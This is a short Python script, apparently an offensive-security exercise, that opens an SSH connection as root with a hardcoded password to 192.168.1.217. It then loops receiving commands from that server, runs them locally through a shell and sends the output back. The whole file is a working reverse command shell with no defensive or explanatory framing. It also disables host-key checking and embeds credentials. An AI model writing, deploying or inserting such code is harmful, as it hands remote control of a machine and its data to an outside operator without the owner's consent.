##!/usr/bin/env python
###__Author__ = "dscdtc"###
import subprocess
import paramiko

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #miyaorenzheng
    #client.load_host_keys('/home/justin/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        print ssh_session.recv(1024) #read banner
        while True:
            command = ssh_session.recv(1024) #get command from server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(e)#
        client.close()
    return

ssh_command('192.168.1.217', 'root', 'toor', 'id')
